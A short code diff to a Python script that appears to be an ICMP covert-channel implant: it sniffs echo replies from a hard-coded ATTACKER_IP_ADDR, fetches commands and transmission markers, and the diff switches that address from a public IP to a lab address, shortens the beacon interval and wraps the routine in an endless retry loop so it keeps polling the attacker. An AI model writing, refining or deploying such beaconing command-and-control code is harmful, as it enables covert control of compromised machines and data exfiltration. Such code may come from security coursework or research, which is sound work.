@@ -9,8 +9,8 @@ ASK_FOR_COMMAND_ID = 220
 START_TRANSMISSION_ID = 240
 ONGOING_TRANSMISSION_ID = 250
 END_TRANSMISSION_ID = 255
-FREQUENCY = 60 * 2  # 60s * 2 = 2 minutes
-ATTACKER_IP_ADDR = "137.194.157.185"
+FREQUENCY = 60 * 1  # 60s * 1 = 1 minute(s)
+ATTACKER_IP_ADDR = "10.10.10.2"
 DEFAULT_TIMEOUT = None
 DEFAULT_PAYLOAD = b''
 
@@ -69,7 +69,8 @@ def retrieve_command(response):
 
 
 def receive_response_packet(request, timeout, nb_responses):
-    return scapy.sniff(lfilter=lambda response: match_response_to_request(response, request), count=nb_responses, timeout=timeout)
+    return scapy.sniff(filter=f"ip host {ATTACKER_IP_ADDR} and ip proto icmp and icmp[icmptype] = icmp-echoreply",
+                       count=nb_responses, timeout=timeout)
 
 
 def can_proceed(ip_addr):
@@ -136,7 +137,14 @@ def forge_random_command():
 
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
-    if can_proceed(ATTACKER_IP_ADDR):
-        accomplish_routine(ATTACKER_IP_ADDR)
-    else:
-        time.sleep(FREQUENCY)
+    while True:
+        try:
+            if can_proceed(ATTACKER_IP_ADDR):
+                accomplish_routine(ATTACKER_IP_ADDR)
+        except:
+            print("Something went wrong")
+        else:
+            print("Nothing went wrong!")
+        finally:
+            print(f"See you in {FREQUENCY} min(s)")
+            time.sleep(FREQUENCY)
